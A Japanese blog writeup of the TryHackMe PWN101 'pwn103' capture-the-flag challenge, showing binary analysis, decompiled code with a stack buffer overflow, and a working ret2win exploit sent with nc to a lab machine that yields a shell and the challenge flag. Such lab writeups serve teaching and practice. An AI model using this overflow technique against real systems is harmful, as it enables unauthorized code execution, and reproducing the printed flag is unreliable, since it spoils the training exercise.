---
title: TryHackMe PWN101 Writeup (3) PWN103
pubDatetime: 2026-04-25T03:00:00+09:00
description: TryHackMe PWN101 Challenge 3のWriteup
tags: [TryHackMe, Writeup, Pwn]
draft: false
---

## file

```shellsession
$ file pwn103-1644300337872.pwn103
pwn103-1644300337872.pwn103: ELF 64-bit LSB executable, x86-64, version 1
(SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3df2200610f5e40aa42eadb73597910054cf4c9f, for GNU/Linux 3.2.0, not stripped
```

## checksec

```shellsession
$ .venv/bin/pwn checksec pwn103-1644300337872.pwn103
[*] '/home/hat0uma/work/pwn103-1644300337872.pwn103'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

## 実行

いろいろコマンドがついてる。

```shellsession
$ ./pwn103-1644300337872.pwn103
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

  [THM Discord Server]

➖➖➖➖➖➖➖➖➖➖➖
1) 📢 Announcements
2) 📜 Rules
3) 🗣  General
4) 🏠 rooms discussion
5) 🤖 Bot commands
➖➖➖➖➖➖➖➖➖➖➖
⌨️  Choose the channel: 1

📢 Announcements:

A new room is available!
Check it out: https://tryhackme.com/room/binaryexploitation
```

## Ghidra

`admins_only`っていういかにもな関数があるのでそこに頑張って飛ばせる。

```c
void main(void)

{
  undefined4 local_c;

  setup();
  banner();
  puts(&DAT_00403298);
  puts(&DAT_004032c0);
  puts(&DAT_00403298);
  printf(&DAT_00403323);
  __isoc99_scanf(&DAT_00403340,&local_c);
  switch(local_c) {
  default:
    main();
    break;
  case 1:
    announcements();
    break;
  case 2:
    rules();
    break;
  case 3:
    general();
    break;
  case 4:
    discussion();
    break;
  case 5:
    bot_cmd();
  }
  return;
}

void admins_only(void)

{
  puts(&DAT_00403267);
  puts(&DAT_0040327c);
  system("/bin/sh");
  return;
}
```

generalが%sなのでBOFできる。
NO PIEなので`admins_only`のアドレスも固定。
returnに書き込むだけ

```c
void general(void)

{
  int iVar1;
  char local_28 [32];

  puts(&DAT_004023aa);
  puts(&DAT_004023c0);
  puts(&DAT_004023e8);
  puts(&DAT_00402418);
  printf("------[pwner]: ");
  __isoc99_scanf(&DAT_0040245c,local_28);
  iVar1 = strcmp(local_28,"yes");
  if (iVar1 == 0) {
    puts(&DAT_00402463);
    main();
  }
  else {
    puts(&DAT_0040247f);
  }
  return;
}
```

## solver

注意としてadmins_onlyの先頭(PUSH RBP)に飛ぶと、system("/bin/sh")が実行できない。
system関数はスタックのアライメントが16バイト区切りじゃないと動かない。
そのため、PUSH RBPの次に飛ぶ。

```shellsession
root@ip-10-144-107-4:~# echo -ne "3\n" > test.bin
root@ip-10-144-107-4:~# printf "%032d" 0 >> test.bin
root@ip-10-144-107-4:~# printf "%08d" 0 >> test.bin # saved rbp
root@ip-10-144-107-4:~# echo -ne "\x55\x15\x40\x00\x00\x00\x00\x00" >> test.bin
root@ip-10-144-107-4:~# cat test.bin - | nc 10.144.129.186 9003
\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff
\u28ff\u28ff\u28ff\u285f\u2801\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2808\u28b9\u28ff\u28ff\u28ff
\u28ff\u28ff\u28ff\u2847\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u28b8\u28ff\u28ff\u28ff
\u28ff\u28ff\u28ff\u2847\u2804\u2804\u2804\u28a0\u28f4\u28fe\u28f5\u28f6\u28f6\u28fe\u28ff\u28e6\u2844\u2804\u2804\u2804\u28b8\u28ff\u28ff\u28ff
\u28ff\u28ff\u28ff\u2847\u2804\u2804\u2880\u28fe\u28ff\u28ff\u28bf\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u2844\u2804\u2804\u28b8\u28ff\u28ff\u28ff
\u28ff\u28ff\u28ff\u2847\u2804\u2804\u28b8\u28ff\u28ff\u28e7\u28c0\u28fc\u28ff\u28c4\u28e0\u28ff\u28ff\u28ff\u2804\u2804\u28b8\u28ff\u28ff\u28ff
\u28ff\u28ff\u28ff\u2847\u2804\u2804\u2818\u283b\u28b7\u286f\u281b\u281b\u281b\u281b\u28ab\u28ff\u281f\u281b\u2804\u2804\u28b8\u28ff\u28ff\u28ff
\u28ff\u28ff\u28ff\u2847\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u28b8\u28ff\u28ff\u28ff
\u28ff\u28ff\u28ff\u28e7\u2840\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u2804\u28a1\u28c0\u2804\u2804\u28b8\u28ff\u28ff\u28ff
\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28f6\u28c6\u28f8\u28ff\u28ff\u28ff
\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff\u28ff

  [THM Discord Server]

\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796
1) \U0001f4e2 Announcements
2) \U0001f4dc Rules
3) \U0001f5e3  General
4) \U0001f3e0 rooms discussion
5) \U0001f916 Bot commands
\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796\u2796
\u2328\ufe0f  Choose the channel:
\U0001f5e3  General:

------[jopraveen]: Hello pwners \U0001f44b
------[jopraveen]: Hope you're doing well \U0001f604
------[jopraveen]: You found the vuln, right? \U0001f914

------[pwner]:
Try harder!!! \U0001f4aa

\U0001f46e  Admins only:

Welcome admin \U0001f604
ls
flag.txt
pwn103
pwn103.c
cat flag.txt
THM{w3lC0m3_4Dm1N}
^C
```
